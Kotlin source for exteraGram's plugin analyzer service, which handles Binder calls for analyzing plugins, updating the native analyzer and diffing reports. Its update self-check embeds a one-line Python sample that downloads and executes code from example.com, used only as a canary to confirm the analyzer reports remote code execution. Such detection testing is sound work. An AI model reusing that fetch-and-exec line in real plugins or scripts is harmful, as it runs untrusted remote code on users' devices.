/*

 This is the source code of exteraGram for Android.

 We do not and cannot prevent the use of our code,
 but be respectful and credit the original author.

 Copyright @exteraGram, 2022-2026

 Licensed under the GNU GPL v. 3 or later, with the additional terms
 in ADDITIONAL_TERMS.md at the root of the repository.

*/

package com.exteragram.messenger.plugins.analyzer

import android.app.Service
import android.content.Intent
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.os.Process
import com.exteragram.messenger.plugins.updates.sha256Hex
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class PluginAnalyzerService : Service() {

    private val lock = Any()
    private val root by lazy { File(noBackupFilesDir, "plugin_analyzer") }
    private val cache by lazy { AnalyzerCache(File(root, "reports")) }

    private var buildId: String? = null
    private var attemptedUpdate = false
    private var lastReport: Report? = null

    private class Report(val buildId: String, val sha256: String, val name: String, val json: String)

    private val binder = object : Binder() {
        override fun onTransact(code: Int, data: Parcel, reply: Parcel?, flags: Int): Boolean {
            if (code < FIRST_CALL || code > LAST_CALL) {
                return super.onTransact(code, data, reply, flags)
            }
            if (getCallingUid() != Process.myUid()) {
                return false
            }
            data.enforceInterface(DESCRIPTOR)
            when (code) {
                CALL_PREPARE -> prepare(data, reply)
                CALL_PID -> reply?.writeInt(Process.myPid())
                CALL_ANALYZE -> analyze(data, reply)
                CALL_DIFF -> diff(data, reply)
            }
            return true
        }
    }

    override fun onBind(intent: Intent?): IBinder = binder

    override fun onDestroy() {
        super.onDestroy()
        Process.killProcess(Process.myPid())
    }

    private fun prepare(data: Parcel, reply: Parcel?) {
        val payload = data.readString().orEmpty()
        val signature = data.readString().orEmpty()
        synchronized(lock) {
            val (status, error) = try {
                prepareUpdate(payload, signature) to null
            } catch (e: IOException) {
                PREPARE_INVALID_ARCHIVE to e.toString()
            } catch (e: LinkageError) {
                PREPARE_REJECT to e.toString()
            } catch (e: Exception) {
                PREPARE_RETRY to e.toString()
            }
            reply?.writeInt(status)
            reply?.writeString(error)
        }
    }

    private fun prepareUpdate(payload: String, signature: String): Int {
        val update = AnalyzerUpdate.parse(payload, signature) ?: return PREPARE_RETRY
        val store = AnalyzerUpdateStore(this)
        if (store.candidates().none { it.id == update.id }) return PREPARE_RETRY
        val current = buildId
        if (current != null) return if (current == update.id) PREPARE_OK else PREPARE_RETRY
        if (attemptedUpdate) return PREPARE_RETRY
        val library = update.readLibrary(update.archive(this))
        attemptedUpdate = true
        System.loadLibrary("extera_analyzer_loader")
        if (!AnalyzerNative.loadUpdate(library, payload, signature)) return PREPARE_LOAD_FAILED
        if (!checkUpdate()) return PREPARE_REJECT
        useBuild(update.id)
        cache.prune(store.retainedIds() + listOfNotNull(analyzerBuildId(this)))
        return PREPARE_OK
    }

    private fun checkUpdate(): Boolean {
        val python = "__id__ = 'analyzer_check'\nimport requests\nexec(requests.get('https://example.com/plugin.py').text)\n".toByteArray()
        val archive = ByteArrayOutputStream().apply {
            ZipOutputStream(this).use { zip ->
                zip.putNextEntry(ZipEntry("main.py"))
                zip.write(python)
                zip.closeEntry()
            }
        }.toByteArray()
        return try {
            val sourceReport = checkReport(python, "analyzer_check.plugin") ?: return false
            val archiveReport = checkReport(archive, "analyzer_check.zip") ?: return false
            val diff = JSONObject(AnalyzerNative.diff(sourceReport, archiveReport).decodeToString())
            diff.optString("old") == python.sha256Hex() && diff.optString("new") == archive.sha256Hex() &&
                diff.optJSONArray("new_statements") != null && diff.optJSONArray("new_findings") != null
        } catch (_: Exception) {
            false
        }
    }

    private fun checkReport(bytes: ByteArray, name: String): ByteArray? {
        val report = AnalyzerNative.analyze(bytes, name.toByteArray())
        val parsed = JSONObject(report.decodeToString())
        val statements = parsed.optJSONArray("statements") ?: return null
        return report.takeIf {
            parsed.optInt("schema") == AnalyzerUpdate.REPORT_SCHEMA && parsed.optJSONObject("analyzer") != null &&
                parsed.optJSONArray("findings") != null && parsed.optJSONObject("subject")?.optString("sha256") == bytes.sha256Hex() &&
                (0 until statements.length()).any { statements.optJSONObject(it)?.optString("id") == "remote_code" }
        }
    }

    private fun analyze(data: Parcel, reply: Parcel?) {
        val path = data.readString().orEmpty()
        val name = data.readString().orEmpty()
        val sha256 = data.readString().orEmpty()
        val useCache = data.readInt() != 0

        synchronized(lock) {
            respond(reply) {
                val buildId = ensureLibrary()
                val report = reportFor(buildId, path, name, sha256, useCache)
                lastReport = Report(buildId, sha256, name, report)
                reply?.writeInt(STATUS_OK)
                reply?.writeString(buildId)
                reply?.writeString(report)
            }
        }
    }

    private fun diff(data: Parcel, reply: Parcel?) {
        val name = data.readString().orEmpty()
        val sha256 = data.readString().orEmpty()
        val previousPath = data.readString().orEmpty()
        val previousName = data.readString().orEmpty()
        val previousSha256 = data.readString().orEmpty()

        synchronized(lock) {
            respond(reply) {
                val buildId = ensureLibrary()
                val report = lastReport?.takeIf { it.buildId == buildId && it.sha256 == sha256 && it.name == name }?.json
                    ?: cache.get(buildId, sha256, name)
                    ?: throw IllegalStateException("report is no longer available")
                val previous = reportFor(buildId, previousPath, previousName, previousSha256, true)
                val diff = AnalyzerNative.diff(previous.toByteArray(), report.toByteArray()).toString(Charsets.UTF_8)
                reply?.writeInt(STATUS_OK)
                reply?.writeString(buildId)
                reply?.writeString(diff)
            }
        }
    }

    private inline fun respond(reply: Parcel?, block: () -> Unit) {
        val (status, message) = try {
            block()
            return
        } catch (e: UnavailableException) {
            STATUS_UNAVAILABLE to e.message
        } catch (e: UnsatisfiedLinkError) {
            STATUS_UNAVAILABLE to e.toString()
        } catch (e: IllegalStateException) {
            STATUS_ERROR to e.message
        } catch (e: Exception) {
            STATUS_ERROR to e.toString()
        }
        reply?.writeInt(status)
        reply?.writeString(message)
    }

    private fun reportFor(
        buildId: String,
        path: String,
        name: String,
        sha256: String,
        useCache: Boolean,
    ): String {
        if (useCache) {
            cache.get(buildId, sha256, name)?.let { return it }
        }
        val data = File(path).readBytes()
        if (data.sha256Hex() != sha256) {
            throw IllegalStateException("plugin file changed during analysis")
        }
        val report = AnalyzerNative.analyze(data, name.toByteArray()).toString(Charsets.UTF_8)
        cache.put(buildId, sha256, name, report)
        return report
    }

    private fun ensureLibrary(): String {
        buildId?.let { return it }
        if (attemptedUpdate) throw UnavailableException("Analyzer update requires a new process")
        val id = analyzerBuildId(this) ?: throw UnavailableException("analyzer is not packaged in this build")
        File(root, "runtime").deleteRecursively()
        System.loadLibrary(LIBRARY)
        useBuild(id)
        return id
    }

    private fun useBuild(id: String) {
        cache.expire()
        buildId = id
    }

    private class UnavailableException(message: String) : Exception(message)

    companion object {
        const val DESCRIPTOR = "com.exteragram.messenger.plugins.analyzer"

        const val CALL_PID = IBinder.FIRST_CALL_TRANSACTION
        const val CALL_ANALYZE = IBinder.FIRST_CALL_TRANSACTION + 1
        const val CALL_PREPARE = IBinder.FIRST_CALL_TRANSACTION + 2
        const val CALL_DIFF = IBinder.FIRST_CALL_TRANSACTION + 3
        internal const val PREPARE_OK = 0
        internal const val PREPARE_RETRY = 1
        internal const val PREPARE_REJECT = 2
        internal const val PREPARE_INVALID_ARCHIVE = 3
        internal const val PREPARE_LOAD_FAILED = 4
        private const val FIRST_CALL = CALL_PID
        private const val LAST_CALL = CALL_DIFF


        const val STATUS_OK = 0
        const val STATUS_UNAVAILABLE = 1
        const val STATUS_ERROR = 2

        private const val LIBRARY = "extera_analyzer"
    }
}
